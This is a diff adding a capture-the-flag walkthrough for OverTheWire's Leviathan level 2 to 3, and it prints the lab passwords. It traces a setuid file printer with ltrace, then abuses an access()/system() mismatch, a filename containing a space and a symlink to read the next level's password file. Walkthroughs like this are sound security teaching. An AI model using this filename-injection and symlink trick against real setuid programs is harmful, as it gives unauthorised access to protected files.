@@ -88,3 +88,89 @@ $ cat /etc/leviathan_pass/leviathan2
 ```
 
 So that's it! We are now leviathan2! The password is `ougahZi8Ta`
+
+### Level 2 => 3
+
+Now it's getting harder...
+
+```console
+$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
+drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+
+$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+
+$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+```
+
+Of course it can't be that easy!
+
+Will ltrace unveil the mistery?
+
+```console
+$ ltrace ./printfile hello.txt
+__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
+access("hello.txt", 4)                                   = -1
+puts("You cant have that file..."You cant have that file...
+)                       = 27
++++ exited (status 1) +++
+```
+
+Let's try inputting a blank space in the filename.
+
+```console
+$ ltrace ~/printfile "hello world.txt"
+__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
+access("hello world.txt", 4)                             = 0
+snprintf("/bin/cat hello world.txt", 511, "/bin/cat %s", "hello world.txt") = 24
+geteuid()                                                = 12002
+geteuid()                                                = 12002
+setreuid(12002, 12002)                                   = 0
+system("/bin/cat hello world.txt"/bin/cat: hello: No such file or directory
+/bin/cat: world.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                   = 256
++++ exited (status 0) +++
+```
+
+Instead of accessing "hello world.txt" is separates it in two making it two files to check. Interesting...
+
+Aha! This file calls an *access()* command, which, according to it's man page, checks if you are permitted to open a specific file.
+It does it by looking at the **OWNER** of the file (real user), not at the executor (effective user). That's it! All there's left to do is to create a file that referes to */etc/leviathan_pass/leviathan3*.
+
+Symbolic link may do it. But first, create a directory under /tmp.
+
+```console
+$ mkdir /tmp/adam23 && cd /tmp/adam23
+$ touch hello\ world.txt
+$ ln -s /etc/leviathan_pass/leviathan3 /tmp/adam23/hello
+$ ls -al
+total 268
+drwxr-sr-x   2 leviathan2 root   4096 Mar  8 18:34 .
+drwxrws-wt 177 root       root 266240 Mar  8 18:34 ..
+lrwxrwxrwx   1 leviathan2 root     30 Mar  8 18:34 hello -> /etc/leviathan_pass/leviathan3
+-rw-r--r--   1 leviathan2 root      0 Mar  8 18:16 hello world.txt
+```
+
+OK. Now run the command
+
+```console
+$ ~/printfile "hello world.txt"
+Ahdiemoo1j
+/bin/cat: world.txt: No such file or directory
+```
+
+And there it is!
+The password is `Ahdiemoo1j`
+
+### Level 3 => 4
+
